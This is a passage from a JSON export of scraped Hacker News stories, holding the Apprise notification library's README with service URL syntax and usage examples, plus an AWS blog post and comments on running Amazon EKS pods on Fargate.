Supported Notifications The section identifies all of the services supported by this library. Check out the wiki for more information on the supported modules here. Popular Notification Services The table below identifies the services this tool supports and some example service urls you need to use in order to take advantage of it. Click on any of the services listed below to get more details on how you can configure Apprise to access them. Notification Service Service ID Default Port Example Syntax Apprise API apprise:// or apprises:// (TCP) 80 or 443 apprise://hostname/Token Boxcar boxcar:// (TCP) 443 boxcar://hostnameboxcar://hostname/@tagboxcar://hostname/device_tokenboxcar://hostname/device_token1/device_token2/device_tokenNboxcar://hostname/@tag/@tag2/device_token Discord discord:// (TCP) 443 discord://webhook_id/webhook_tokendiscord://avatar@webhook_id/webhook_token Emby emby:// or embys:// (TCP) 8096 emby://user@hostname/emby://user:password@hostname Enigma2 enigma2:// or enigma2s:// (TCP) 80 or 443 enigma2://hostname Faast faast:// (TCP) 443 faast://authorizationtoken FCM fcm:// (TCP) 443 fcm://project@apikey/DEVICE_IDfcm://project@apikey/#TOPICfcm://project@apikey/DEVICE_ID1/#topic1/#topic2/DEVICE_ID2/ Flock flock:// (TCP) 443 flock://tokenflock://botname@tokenflock://app_token/u:useridflock://app_token/g:channel_idflock://app_token/u:userid/g:channel_id Gitter gitter:// (TCP) 443 gitter://token/roomgitter://token/room1/room2/roomN Google Chat gchat:// (TCP) 443 gchat://workspace/key/token Gotify gotify:// or gotifys:// (TCP) 80 or 443 gotify://hostname/tokengotifys://hostname/token?priority=high Growl growl:// (UDP) 23053 growl://hostnamegrowl://hostname:portnogrowl://password@hostnamegrowl://password@hostname:portNote: you can also use the get parameter version which can allow the growl request to behave using the older v1.x protocol. An example would look like: growl://hostname?version=1 Home Assistant hassio:// or hassios:// (TCP) 8123 or 443 hassio://hostname/accesstokenhassio://user@hostname/accesstokenhassio://user:password@hostname:port/accesstokenhassio://hostname/optional/path/accesstoken IFTTT ifttt:// (TCP) 443 ifttt://webhooksID/Eventifttt://webhooksID/Event1/Event2/EventNifttt://webhooksID/Event1/?+Key=Valueifttt://webhooksID/Event1/?-Key=value1 Join join:// (TCP) 443 join://apikey/devicejoin://apikey/device1/device2/deviceN/join://apikey/groupjoin://apikey/groupA/groupB/groupNjoin://apikey/DeviceA/groupA/groupN/DeviceN/ KODI kodi:// or kodis:// (TCP) 8080 or 443 kodi://hostnamekodi://user@hostnamekodi://user:password@hostname:port Kumulos kumulos:// (TCP) 443 kumulos://apikey/serverkey LaMetric Time lametric:// (TCP) 443 lametric://apikey@device_ipaddrlametric://apikey@hostname:portlametric://client_id@client_secret Mailgun mailgun:// (TCP) 443 mailgun://user@hostname/apikeymailgun://user@hostname/apikey/emailmailgun://user@hostname/apikey/email1/email2/emailNmailgun://user@hostname/apikey/?name=\"From%20User\" Matrix matrix:// or matrixs:// (TCP) 80 or 443 matrix://hostnamematrix://user@hostnamematrixs://user:pass@hostname:port/#room_aliasmatrixs://user:pass@hostname:port/!room_idmatrixs://user:pass@hostname:port/#room_alias/!room_id/#room2matrixs://token@hostname:port/?webhook=matrixmatrix://user:token@hostname/?webhook=slack&format=markdown Mattermost mmost:// or mmosts:// (TCP) 8065 mmost://hostname/authkeymmost://hostname:80/authkeymmost://user@hostname:80/authkeymmost://hostname/authkey?channel=channelmmosts://hostname/authkeymmosts://user@hostname/authkey Microsoft Teams msteams:// (TCP) 443 msteams://TokenA/TokenB/TokenC/ MQTT mqtt:// or mqtts:// (TCP) 1883 or 8883 mqtt://hostname/topicmqtt://user@hostname/topicmqtts://user:pass@hostname:9883/topic Nextcloud ncloud:// or nclouds:// (TCP) 80 or 443 ncloud://adminuser:pass@host/Usernclouds://adminuser:pass@host/User1/User2/UserN Notica notica:// (TCP) 443 notica://Token/ Notifico notifico:// (TCP) 443 notifico://ProjectID/MessageHook/ Office 365 o365:// (TCP) 443 o365://TenantID:AccountEmail/ClientID/ClientSecreto365://TenantID:AccountEmail/ClientID/ClientSecret/TargetEmailo365://TenantID:AccountEmail/ClientID/ClientSecret/TargetEmail1/TargetEmail2/TargetEmailN OneSignal onesignal:// (TCP) 443 onesignal://AppID@APIKey/PlayerIDonesignal://TemplateID:AppID@APIKey/UserIDonesignal://AppID@APIKey/#IncludeSegmentonesignal://AppID@APIKey/Email Opsgenie opsgenie:// (TCP) 443 opsgenie://APIKeyopsgenie://APIKey/UserIDopsgenie://APIKey/#Teamopsgenie://APIKey/*Scheduleopsgenie://APIKey/^Escalation ParsePlatform parsep:// or parseps:// (TCP) 80 or 443 parsep://AppID:MasterKey@Hostnameparseps://AppID:MasterKey@Hostname PopcornNotify popcorn:// (TCP) 443 popcorn://ApiKey/ToPhoneNopopcorn://ApiKey/ToPhoneNo1/ToPhoneNo2/ToPhoneNoN/popcorn://ApiKey/ToEmailpopcorn://ApiKey/ToEmail1/ToEmail2/ToEmailN/popcorn://ApiKey/ToPhoneNo1/ToEmail1/ToPhoneNoN/ToEmailN Prowl prowl:// (TCP) 443 prowl://apikeyprowl://apikey/providerkey PushBullet pbul:// (TCP) 443 pbul://accesstokenpbul://accesstoken/#channelpbul://accesstoken/A_DEVICE_IDpbul://accesstoken/email@address.compbul://accesstoken/#channel/#channel2/email@address.net/DEVICE Pushjet pjet:// or pjets:// (TCP) 80 or 443 pjet://hostname/secretpjet://hostname:port/secretpjets://secret@hostname/secretpjets://hostname:port/secret Push (Techulus) push:// (TCP) 443 push://apikey/ Pushed pushed:// (TCP) 443 pushed://appkey/appsecret/pushed://appkey/appsecret/#ChannelAliaspushed://appkey/appsecret/#ChannelAlias1/#ChannelAlias2/#ChannelAliasNpushed://appkey/appsecret/@UserPushedIDpushed://appkey/appsecret/@UserPushedID1/@UserPushedID2/@UserPushedIDN Pushover pover:// (TCP) 443 pover://user@tokenpover://user@token/DEVICEpover://user@token/DEVICE1/DEVICE2/DEVICENNote: you must specify both your user_id and token PushSafer psafer:// or psafers:// (TCP) 80 or 443 psafer://privatekeypsafers://privatekey/DEVICEpsafer://privatekey/DEVICE1/DEVICE2/DEVICEN Reddit reddit:// (TCP) 443 reddit://user:password@app_id/app_secret/subredditreddit://user:password@app_id/app_secret/sub1/sub2/subN Rocket.Chat rocket:// or rockets:// (TCP) 80 or 443 rocket://user:password@hostname/RoomID/Channelrockets://user:password@hostname:443/#Channel1/#Channel1/RoomIDrocket://user:password@hostname/#Channelrocket://webhook@hostnamerockets://webhook@hostname/@User/#Channel Ryver ryver:// (TCP) 443 ryver://Organization/Tokenryver://botname@Organization/Token SendGrid sendgrid:// (TCP) 443 sendgrid://APIToken:FromEmail/sendgrid://APIToken:FromEmail/ToEmailsendgrid://APIToken:FromEmail/ToEmail1/ToEmail2/ToEmailN/ SimplePush spush:// (TCP) 443 spush://apikeyspush://salt:password@apikeyspush://apikey?event=Apprise Slack slack:// (TCP) 443 slack://TokenA/TokenB/TokenC/slack://TokenA/TokenB/TokenC/Channelslack://botname@TokenA/TokenB/TokenC/Channelslack://user@TokenA/TokenB/TokenC/Channel1/Channel2/ChannelN SMTP2Go smtp2go:// (TCP) 443 smtp2go://user@hostname/apikeysmtp2go://user@hostname/apikey/emailsmtp2go://user@hostname/apikey/email1/email2/emailNsmtp2go://user@hostname/apikey/?name=\"From%20User\" Streamlabs strmlabs:// (TCP) 443 strmlabs://AccessToken/strmlabs://AccessToken/?name=name&identifier=identifier&amount=0&currency=USD SparkPost sparkpost:// (TCP) 443 sparkpost://user@hostname/apikeysparkpost://user@hostname/apikey/emailsparkpost://user@hostname/apikey/email1/email2/emailNsparkpost://user@hostname/apikey/?name=\"From%20User\" Spontit spontit:// (TCP) 443 spontit://UserID@APIKey/spontit://UserID@APIKey/Channelspontit://UserID@APIKey/Channel1/Channel2/ChannelN Syslog syslog:// (UDP) 514 (if hostname specified) syslog://syslog://Facilitysyslog://hostnamesyslog://hostname/Facility Telegram tgram:// (TCP) 443 tgram://bottoken/ChatIDtgram://bottoken/ChatID1/ChatID2/ChatIDN Twitter twitter:// (TCP) 443 twitter://CKey/CSecret/AKey/ASecrettwitter://user@CKey/CSecret/AKey/ASecrettwitter://CKey/CSecret/AKey/ASecret/User1/User2/User2twitter://CKey/CSecret/AKey/ASecret?mode=tweet Twist twist:// (TCP) 443 twist://pasword:logintwist://password:login/#channeltwist://password:login/#team:channeltwist://password:login/#team:channel1/channel2/#team3:channel XBMC xbmc:// or xbmcs:// (TCP) 8080 or 443 xbmc://hostnamexbmc://user@hostnamexbmc://user:password@hostname:port XMPP xmpp:// or xmpps:// (TCP) 5222 or 5223 xmpp://password@hostnamexmpp://user:password@hostnamexmpps://user:password@hostname:port?jid=user@hostname/resourcexmpps://password@hostname/target@myhost, target2@myhost/resource Webex Teams (Cisco) wxteams:// (TCP) 443 wxteams://Token Zulip Chat zulip:// (TCP) 443 zulip://botname@Organization/Tokenzulip://botname@Organization/Token/Streamzulip://botname@Organization/Token/Email SMS Notification Support Notification Service Service ID Default Port Example Syntax AWS SNS sns:// (TCP) 443 sns://AccessKeyID/AccessSecretKey/RegionName/+PhoneNosns://AccessKeyID/AccessSecretKey/RegionName/+PhoneNo1/+PhoneNo2/+PhoneNoNsns://AccessKeyID/AccessSecretKey/RegionName/Topicsns://AccessKeyID/AccessSecretKey/RegionName/Topic1/Topic2/TopicN ClickSend clicksend:// (TCP) 443 clicksend://user:pass@PhoneNoclicksend://user:pass@ToPhoneNo1/ToPhoneNo2/ToPhoneNoN D7 Networks d7sms:// (TCP) 443 d7sms://user:pass@PhoneNod7sms://user:pass@ToPhoneNo1/ToPhoneNo2/ToPhoneNoN DingTalk dingtalk:// (TCP) 443 dingtalk://token/dingtalk://token/ToPhoneNodingtalk://token/ToPhoneNo1/ToPhoneNo2/ToPhoneNo1/ Kavenegar kavenegar:// (TCP) 443 kavenegar://ApiKey/ToPhoneNokavenegar://FromPhoneNo@ApiKey/ToPhoneNokavenegar://ApiKey/ToPhoneNo1/ToPhoneNo2/ToPhoneNoN MessageBird msgbird:// (TCP) 443 msgbird://ApiKey/FromPhoneNomsgbird://ApiKey/FromPhoneNo/ToPhoneNomsgbird://ApiKey/FromPhoneNo/ToPhoneNo1/ToPhoneNo2/ToPhoneNoN/ MSG91 msg91:// (TCP) 443 msg91://AuthKey/ToPhoneNomsg91://SenderID@AuthKey/ToPhoneNomsg91://AuthKey/ToPhoneNo1/ToPhoneNo2/ToPhoneNoN/ Nexmo nexmo:// (TCP) 443 nexmo://ApiKey:ApiSecret@FromPhoneNonexmo://ApiKey:ApiSecret@FromPhoneNo/ToPhoneNonexmo://ApiKey:ApiSecret@FromPhoneNo/ToPhoneNo1/ToPhoneNo2/ToPhoneNoN/ Sinch sinch:// (TCP) 443 sinch://ServicePlanId:ApiToken@FromPhoneNosinch://ServicePlanId:ApiToken@FromPhoneNo/ToPhoneNosinch://ServicePlanId:ApiToken@FromPhoneNo/ToPhoneNo1/ToPhoneNo2/ToPhoneNoN/sinch://ServicePlanId:ApiToken@ShortCode/ToPhoneNosinch://ServicePlanId:ApiToken@ShortCode/ToPhoneNo1/ToPhoneNo2/ToPhoneNoN/ Twilio twilio:// (TCP) 443 twilio://AccountSid:AuthToken@FromPhoneNotwilio://AccountSid:AuthToken@FromPhoneNo/ToPhoneNotwilio://AccountSid:AuthToken@FromPhoneNo/ToPhoneNo1/ToPhoneNo2/ToPhoneNoN/twilio://AccountSid:AuthToken@FromPhoneNo/ToPhoneNo?apikey=Keytwilio://AccountSid:AuthToken@ShortCode/ToPhoneNotwilio://AccountSid:AuthToken@ShortCode/ToPhoneNo1/ToPhoneNo2/ToPhoneNoN/ Desktop Notification Support Notification Service Service ID Default Port Example Syntax Linux DBus Notifications dbus://qt://glib://kde:// n/a dbus://qt://glib://kde:// Linux Gnome Notifications gnome:// n/a gnome:// MacOS X Notifications macosx:// n/a macosx:// Windows Notifications windows:// n/a windows:// Email Support Service ID Default Port Example Syntax mailto:// (TCP) 25 mailto://userid:pass@domain.commailto://domain.com?user=userid&pass=passwordmailto://domain.com:2525?user=userid&pass=passwordmailto://user@gmail.com&pass=passwordmailto://mySendingUsername:mySendingPassword@example.com?to=receivingAddress@example.commailto://userid:password@example.com?smtp=mail.example.com&from=noreply@example.com&name=no%20reply mailtos:// (TCP) 587 mailtos://userid:pass@domain.commailtos://domain.com?user=userid&pass=passwordmailtos://domain.com:465?user=userid&pass=passwordmailtos://user@hotmail.com&pass=passwordmailtos://mySendingUsername:mySendingPassword@example.com?to=receivingAddress@example.commailtos://userid:password@example.com?smtp=mail.example.com&from=noreply@example.com&name=no%20reply Apprise have some email services built right into it (such as yahoo, fastmail, hotmail, gmail, etc) that greatly simplify the mailto:// service. See more details here. Custom Notifications Post Method Service ID Default Port Example Syntax JSON json:// or jsons:// (TCP) 80 or 443 json://hostnamejson://user@hostnamejson://user:password@hostname:portjson://hostname/a/path/to/post/to XML xml:// or xmls:// (TCP) 80 or 443 xml://hostnamexml://user@hostnamexml://user:password@hostname:portxml://hostname/a/path/to/post/to Installation The easiest way is to install this package is from pypi: Command Line A small command line tool is also provided with this package called apprise. If you know the server url's you wish to notify, you can simply provide them all on the command line and send your notifications that way: # Send a notification to as many servers as you want # as you can easily chain one after another (the -vv provides some # additional verbosity to help let you know what is going on): apprise -vv -t 'my title' -b 'my notification body' \\ 'mailto://myemail:mypass@gmail.com' \\ 'pbul://o.gn5kj6nfhv736I7jC3cj3QLRiyhgl98b' # If you don't specify a --body (-b) then stdin is used allowing # you to use the tool as part of your every day administration: cat /proc/cpuinfo | apprise -vv -t 'cpu info' \\ 'mailto://myemail:mypass@gmail.com' # The title field is totally optional uptime | apprise -vv \\ 'discord:///4174216298/JHMHI8qBe7bk2ZwO5U711o3dV_js' Configuration Files No one wants to put their credentials out for everyone to see on the command line. No problem apprise also supports configuration files. It can handle both a specific YAML format or a very simple TEXT format. You can also pull these configuration files via an HTTP query too! You can read more about the expected structure of the configuration files here. # By default if no url or configuration is specified aprise will attempt to load # configuration files (if present): # ~/.apprise # ~/.apprise.yml # ~/.config/apprise # ~/.config/apprise.yml # Windows users can store their default configuration files here: # %APPDATA%/Apprise/apprise # %APPDATA%/Apprise/apprise.yml # %LOCALAPPDATA%/Apprise/apprise # %LOCALAPPDATA%/Apprise/apprise.yml # If you loaded one of those files, your command line gets really easy: apprise -vv -t 'my title' -b 'my notification body' # If you want to deviate from the default paths or specify more than one, # just specify them using the --config switch: apprise -vv -t 'my title' -b 'my notification body' \\ --config=/path/to/my/config.yml # Got lots of configuration locations? No problem, you can specify them all: # Apprise can even fetch the configuration from over a network! apprise -vv -t 'my title' -b 'my notification body' \\ --config=/path/to/my/config.yml \\ --config=https://localhost/my/apprise/config Attaching Files Apprise also supports file attachments too! Specify as many attachments to a notification as you want. # Send a funny image you found on the internet to a colleague: apprise -vv --title 'Agile Joke' \\ --body 'Did you see this one yet?' \\ --attach https://i.redd.it/my2t4d2fx0u31.jpg \\ 'mailto://myemail:mypass@gmail.com' # Easily send an update from a critical server to your dev team apprise -vv --title 'system crash' \\ --body 'I do not think Jim fixed the bug; see attached...' \\ --attach /var/log/myprogram.log \\ --attach /var/debug/core.2345 \\ --tag devteam Developers To send a notification from within your python application, just do the following: import apprise # Create an Apprise instance apobj = apprise.Apprise() # Add all of the notification services by their server url. # A sample email notification: apobj.add('mailto://myuserid:mypass@gmail.com') # A sample pushbullet notification apobj.add('pbul://o.gn5kj6nfhv736I7jC3cj3QLRiyhgl98b') # Then notify these services any time you desire. The below would # notify all of the services loaded into our Apprise object. apobj.notify( body='what a great notification service!', title='my notification title', ) Configuration Files Developers need access to configuration files too. The good news is their use just involves declaring another object (called AppriseConfig) that the Apprise object can ingest. You can also freely mix and match config and notification entries as often as you wish! You can read more about the expected structure of the configuration files here. import apprise # Create an Apprise instance apobj = apprise.Apprise() # Create an Config instance config = apprise.AppriseConfig() # Add a configuration source: config.add('/path/to/my/config.yml') # Add another... config.add('https://myserver:8080/path/to/config') # Make sure to add our config into our apprise object apobj.add(config) # You can mix and match; add an entry directly if you want too # In this entry we associate the 'admin' tag with our notification apobj.add('mailto://myuser:mypass@hotmail.com', tag='admin') # Then notify these services any time you desire. The below would # notify all of the services that have not been bound to any specific # tag. apobj.notify( body='what a great notification service!', title='my notification title', ) # Tagging allows you to specifically target only specific notification # services you've loaded: apobj.notify( body='send a notification to our admin group', title='Attention Admins', # notify any services tagged with the 'admin' tag tag='admin', ) # If you want to notify absolutely everything (reguardless of whether # it's been tagged or not), just use the reserved tag of 'all': apobj.notify( body='send a notification to our admin group', title='Attention Admins', # notify absolutely everything loaded, reguardless on wether # it has a tag associated with it or not: tag='all', ) Attaching Files Attachments are very easy to send using the Apprise API: import apprise # Create an Apprise instance apobj = apprise.Apprise() # Add at least one service you want to notify apobj.add('mailto://myuser:mypass@hotmail.com') # Then send your attachment. apobj.notify( title='A great photo of our family', body='The flash caused Jane to close her eyes! hah! :)', attach='/local/path/to/my/DSC_003.jpg', ) # Send a web based attachment too! In the below example, we connect to a home # security camera and send a live image to an email. By default remote web # content is cached but for a security camera, we might want to call notify # again later in our code so we want our last image retrieved to expire(in # this case after 3 seconds). apobj.notify( title='Latest security image', attach='http:/admin:password@hikvision-cam01/ISAPI/Streaming/channels/101/picture?cache=3' ) To send more than one attachment, just use a list, set, or tuple instead: import apprise # Create an Apprise instance apobj = apprise.Apprise() # Add at least one service you want to notify apobj.add('mailto://myuser:mypass@hotmail.com') # Now add all of the entries we're intrested in: attach = ( # ?name= allows us to rename the actual jpeg as found on the site # to be another name when sent to our receipient(s) 'https://i.redd.it/my2t4d2fx0u31.jpg?name=FlyingToMars.jpg', # Now add another: '/path/to/funny/joke.gif', ) # Send your multiple attachments with a single notify call: apobj.notify( title='Some good jokes.', body='Hey guys, check out these!', attach=attach, ) Want To Learn More? If you're interested in reading more about this and other methods on how to customize your own notifications, please check out the following links: Using the CLI Development API Troubleshooting Configuration File Help Apprise API/Web Interface Showcase Want to help make Apprise better? Contribute to the Apprise Code Base Sponsorship and Donations ",
        "_version_": 1718527417836896256
      },
      {
        "story_id": [21693860],
        "story_author": ["mcrute"],
        "story_descendants": [14],
        "story_score": [50],
        "story_time": ["2019-12-03T16:35:29Z"],
        "story_title": "Amazon EKS on AWS Fargate Now Generally Available",
        "search": [
          "Amazon EKS on AWS Fargate Now Generally Available",
          "https://aws.amazon.com/blogs/aws/amazon-eks-on-aws-fargate-now-generally-available/",
          "Starting today, you can start using Amazon Elastic Kubernetes Service to run Kubernetes pods on AWS Fargate. EKS and Fargate make it straightforward to run Kubernetes-based applications on AWS by removing the need to provision and manage infrastructure for pods. With AWS Fargate, customers dont need to be experts in Kubernetes operations to run a cost-optimized and highly-available cluster. Fargate eliminates the need for customers to create or manage EC2 instances for their Amazon EKS clusters. Customers no longer have to worry about patching, scaling, or securing a cluster of EC2 instances to run Kubernetes applications in the cloud. Using Fargate, customers define and pay for resources at the pod-level. This makes it easy to right-size resource utilization for each application and allow customers to clearly see the cost of each pod. Im now going to use the rest of this blog to explore this new feature further and deploy a simple Kubernetes-based application using Amazon EKS on Fargate. Lets Build a Cluster The simplest way to get a cluster set up is to useeksctl, the official CLI tool for EKS. The command below creates a cluster calleddemo-newsblogwith no worker nodes. eksctl create cluster --name demo-newsblog --region eu-west-1 --fargate This single command did quite a lot under the hood. Not only did it create a cluster for me, amongst other things, it also created a Fargate profile. A Fargate profile, lets me specify which Kubernetes pods I want to run on Fargate, which subnets my pods run in, and provides the IAM execution role used by the Kubernetes agent to download container images to the pod and perform other actions on my behalf. Understanding Fargate profiles is key to understanding how this feature works. So I am going to delete the Fargate profile that was automatically created for me and recreate it manually. To create a Fargate profile, I head over to theAmazon Elastic Kubernetes Service (EKS) console and choose the clusterdemo-newsblog. On the details,UnderFargate profiles, I chooseAdd Fargate profile. I then need to configure my new Fargate profile. For the name, I enter demo-default. In the Pod execution role, only IAM roles with theeks-fargate-pods.amazonaws.comservice principal are shown. The eksctl tool creates an IAM role called AmazonEKSFargatePodExecutionRole, thedocumentationshows how this role can be created from scratch. In the Subnets section, by default, all subnets in my clusters VPC are selected. However, only private subnets are supported for Fargate pods, so I deselect the two public subnets. When I click next, I am taken to the Pod selectors screen. Here it asks me to enter a namespace. I add default, meaning that I want any pods that are created in the default Kubernetes namespace to run on Fargate. Its important to understand that I dont have to modify my Kubernetes app to get the pods running on Fargate, I just need a Fargate Profile if a pod in my Kubernetes app matches the namespace defined in my profile, that pod will run on Fargate. There is also a Match labels feature here, which I am not using. This allows you to specify the labels of the pods that you want to select, so you can get even more specific with which pods run on this profile. Finally, I click Next and then Create. It takes a minute for the profile to create and become active. In this demo, I also want everything to run on Fargate, including theCoreDNS pods that are part of Kubernetes. To get them running on Fargate, I will add a second Fargate profile for everything in thekube-systemnamespace. This time, to add a bit of variety to the demo, I will use the command line to create my profile. Technically, I do not need to create a second profile for this. I could have added an additional namespace to the first profile, but this way, I get to explore an alternative way of creating a profile. First, I create the file below and save it as demo-kube-system-profile.json. { \"fargateProfileName\": \"demo-kube-system\", \"clusterName\": \"demo-news-blog\", \"podExecutionRoleArn\": \"arn:aws:iam::xxx:role/AmazonEKSFargatePodExecutionRole\", \"subnets\": [ \"subnet-0968a124a4e4b0afe\", \"subnet-0723bbe802a360eb9\" ], \"selectors\": [ { \"namespace\": \"kube-system\" } ] } I then navigate to the folder that contains the file above and run thecreate-fargate-profile command in my terminal. aws eks create-fargate-profile --cli-input-json file://demo-kube-system-profile.json I am now ready to deploy a container to my cluster. To keep things simple, I deploy a single instance of nginx using the following kubectl command. kubectl create deployment demo-app --image=nginx I then check to see the state of my pods by running the get pods command. kubectl get pods NAME READY STATUS RESTARTS AGE demo-app-6dbfc49497-67dxk 0/1 Pending 0 13s If I run get nodes I have three nodes(two for coreDNS and one for nginx). These nodes represent the compute resources that have instantiated for me to run my pods. kubectl get nodes NAME STATUS ROLES AGE VERSION fargate-ip-192-168-218-51.eu-west-1.compute.internal Ready <none> 4m45s v1.14.8-eks fargate-ip-192-168-221-91.eu-west-1.compute.internal Ready <none> 2m20s v1.14.8-eks fargate-ip-192-168-243-74.eu-west-1.compute.internal Ready <none> 4m40s v1.14.8-eks After a short time, I rerun the get pods command, and my demo-appnow has a status ofRunning. Meaning my container has been successfully deployed onto Fargate. kubectl get pods NAME READY STATUS RESTARTS AGE demo-app-6dbfc49497-67dxk 1/1 Running 0 3m52s Pricing and Limitations With AWS Fargate, you pay only for the amount of vCPU and memory resources that your pod needs to run. This includes the resources the pod requests in addition to a small amount of memory needed to run Kubernetes components alongside the pod. Pods running on Fargate follow the existing pricing model. vCPU and memory resources are calculated from the time your pods container images are pulled until the pod terminates, rounded up to the nearest second. A minimum charge for 1 minute applies. Additionally, you pay the standard cost for each EKS cluster you run, $0.20 per hour. There are currently a few limitations that you should be aware of: There is a maximum of4 vCPU and 30Gb memory per pod. Currently there is no support for stateful workloads that require persistent volumes or file systems. You cannot run Daemonsets, Privileged pods, or pods that use HostNetwork or HostPort. The only load balancer you can use is an Application Load Balancer. Get Started Today If you want to explore Amazon EKS on AWS Fargate yourself, you can try it now by heading on over to the EKS console in the following regions: US East (N. Virginia), US East (Ohio), Europe (Ireland), and Asia Pacific (Tokyo). Martin ",
          "Great to see - but amazon marketing is approaching Apple levels. Lots of talk of “only service of its kind” where things like Azure Virtual Nodes (ACI + AKS) and Google Cloud Run have been GA for months",
          "I just use fargate directly (ECS I guess) - it works pretty nicely for small apps.<p>I was reading someone wanted EKS but the $180/month for management layer was way too much. Do people use EKS for tiny projects? It seems like a lot of complexity to carry around."
        ],
        "story_type": ["Normal"],
        "url": "https://aws.amazon.com/blogs/aws/amazon-eks-on-aws-fargate-now-generally-available/",
        "comments.comment_id": [21693993, 21694530],
        "comments.comment_author": ["babyyoda", "privateSFacct"],
        "comments.comment_descendants": [0, 1],
        "comments.comment_time": [
          "2019-12-03T16:49:19Z",
          "2019-12-03T17:36:58Z"
        ],
        "comments.comment_text": [
          "Great to see - but amazon marketing is approaching Apple levels. Lots of talk of “only service of its kind” where things like Azure Virtual Nodes (ACI + AKS) and Google Cloud Run have been GA for months",
          "I just use fargate directly (ECS I guess) - it works pretty nicely for small apps.<p>I was reading someone wanted EKS but the $180/month for management layer was way too much. Do people use EKS for tiny projects? It seems like a lot of complexity to carry around."
        ],
        "id": "dad033fa-60f6-4cb5-b95d-31309964c0de",
        "url_text": "Starting today, you can start using Amazon Elastic Kubernetes Service to run Kubernetes pods on AWS Fargate. EKS and Fargate make it straightforward to run Kubernetes-based applications on AWS by removing the need to provision and manage infrastructure for pods. With AWS Fargate, customers dont need to be experts in Kubernetes operations to run a cost-optimized and highly-available cluster. Fargate eliminates the need for customers to create or manage EC2 instances for their Amazon EKS clusters. Customers no longer have to worry about patching, scaling, or securing a cluster of EC2 instances to run Kubernetes applications in the cloud. Using Fargate, customers define and pay for resources at the pod-level. This makes it easy to right-size resource utilization for each application and allow customers to clearly see the cost of each pod. Im now going to use the rest of this blog to explore this new feature further and deploy a simple Kubernetes-based application using Amazon EKS on Fargate. Lets Build a Cluster The simplest way to get a cluster set up is to useeksctl, the official CLI tool for EKS. The command below creates a cluster calleddemo-newsblogwith no worker nodes. eksctl create cluster --name demo-newsblog --region eu-west-1 --fargate This single command did quite a lot under the hood. Not only did it create a cluster for me, amongst other things, it also created a Fargate profile. A Fargate profile, lets me specify which Kubernetes pods I want to run on Fargate, which subnets my pods run in, and provides the IAM execution role used by the Kubernetes agent to download container images to the pod and perform other actions on my behalf. Understanding Fargate profiles is key to understanding how this feature works. So I am going to delete the Fargate profile that was automatically created for me and recreate it manually. To create a Fargate profile, I head over to theAmazon Elastic Kubernetes Service (EKS) console and choose the clusterdemo-newsblog. On the details,UnderFargate profiles, I chooseAdd Fargate profile. I then need to configure my new Fargate profile. For the name, I enter demo-default. In the Pod execution role, only IAM roles with theeks-fargate-pods.amazonaws.comservice principal are shown. The eksctl tool creates an IAM role called AmazonEKSFargatePodExecutionRole, thedocumentationshows how this role can be created from scratch. In the Subnets section, by default, all subnets in my clusters VPC are selected. However, only private subnets are supported for Fargate pods, so I deselect the two public subnets. When I click next, I am taken to the Pod selectors screen. Here it asks me to enter a namespace. I add default, meaning that I want any pods that are created in the default Kubernetes namespace to run on Fargate. Its important to understand that I dont have to modify my Kubernetes app to get the pods running on Fargate, I just need a Fargate Profile if a pod in my Kubernetes app matches the namespace defined in my profile, that pod will run on Fargate. There is also a Match labels feature here, which I am not using. This allows you to specify the labels of the pods that you want to select, so you can get even more specific with which pods run on this profile. Finally, I click Next and then Create. It takes a minute for the profile to create and become active. In this demo, I also want everything to run on Fargate, including theCoreDNS pods that are part of Kubernetes. To get them running on Fargate, I will add a second Fargate profile for everything in thekube-systemnamespace. This time, to add a bit of variety to the demo, I will use the command line to create my profile. Technically, I do not need to create a second profile for this. I could have added an additional namespace to the first profile, but this way, I get to explore an alternative way of creating a profile. First, I create the file below and save it as demo-kube-system-profile.json. { \"fargateProfileName\": \"demo-kube-system\", \"clusterName\": \"demo-news-blog\", \"podExecutionRoleArn\": \"arn:aws:iam::xxx:role/AmazonEKSFargatePodExecutionRole\", \"subnets\": [ \"subnet-0968a124a4e4b0afe\", \"subnet-0723bbe802a360eb9\" ], \"selectors\": [ { \"namespace\": \"kube-system\" } ] } I then navigate to the folder that contains the file above and run thecreate-fargate-profile command in my terminal. aws eks create-fargate-profile --cli-input-json file://demo-kube-system-profile.json I am now ready to deploy a container to my cluster. To keep things simple, I deploy a single instance of nginx using the following kubectl command. kubectl create deployment demo-app --image=nginx I then check to see the state of my pods by running the get pods command. kubectl get pods NAME READY STATUS RESTARTS AGE demo-app-6dbfc49497-67dxk 0/1 Pending 0 13s If I run get nodes I have three nodes(two for coreDNS and one for nginx). These nodes represent the compute resources that have instantiated for me to run my pods. kubectl get nodes NAME STATUS ROLES AGE VERSION fargate-ip-192-168-218-51.eu-west-1.compute.internal Ready <none> 4m45s v1.14.8-eks fargate-ip-192-168-221-91.eu-west-1.compute.internal Ready <none> 2m20s v1.14.8-eks fargate-ip-192-168-243-74.eu-west-1.compute.internal Ready <none> 4m40s v1.14.8-eks After a short time, I rerun the get pods command, and my demo-appnow has a status ofRunning. Meaning my container has been successfully deployed onto Fargate. kubectl get pods NAME READY STATUS RESTARTS AGE demo-app-6dbfc49497-67dxk 1/1 Running 0 3m52s Pricing and Limitations With AWS Fargate, you pay only for the amount of vCPU and memory resources that your pod needs to run. This includes the resources the pod requests in addition to a small amount of memory needed to run Kubernetes components alongside the pod. Pods running on Fargate follow the existing pricing model. vCPU and memory resources are calculated from the time your pods container images are pulled until the pod terminates, rounded up to the nearest second. A minimum charge for 1 minute applies. Additionally, you pay the standard cost for each EKS cluster you run, $0.20 per hour. There are currently a few limitations that you should be aware of: There is a maximum of4 vCPU and 30Gb memory per pod. Currently there is no support for stateful workloads that require persistent volumes or file systems. You cannot run Daemonsets, Privileged pods, or pods that use HostNetwork or HostPort. The only load balancer you can use is an Application Load Balancer. Get Started Today If you want to explore Amazon EKS on AWS Fargate yourself, you can try it now by heading on over to the EKS console in the following regions: US East (N. Virginia), US East (Ohio), Europe (Ireland), and Asia Pacific (Tokyo). Martin ",
        "_version_": 1718527438508523520
      },
      {
        "story_id": [19108787],
        "story_author": ["jaxxstorm"],
        "story_descendants": [346],
        "story_score": [263],
        "story_time": ["2019-02-07T21:31:59Z"],
        "story_title": "Why are we templating YAML?",
        "search": [
          "Why are we templating YAML?",
          "https://leebriggs.co.uk/blog/2019/02/07/why-are-we-templating-yaml.html",
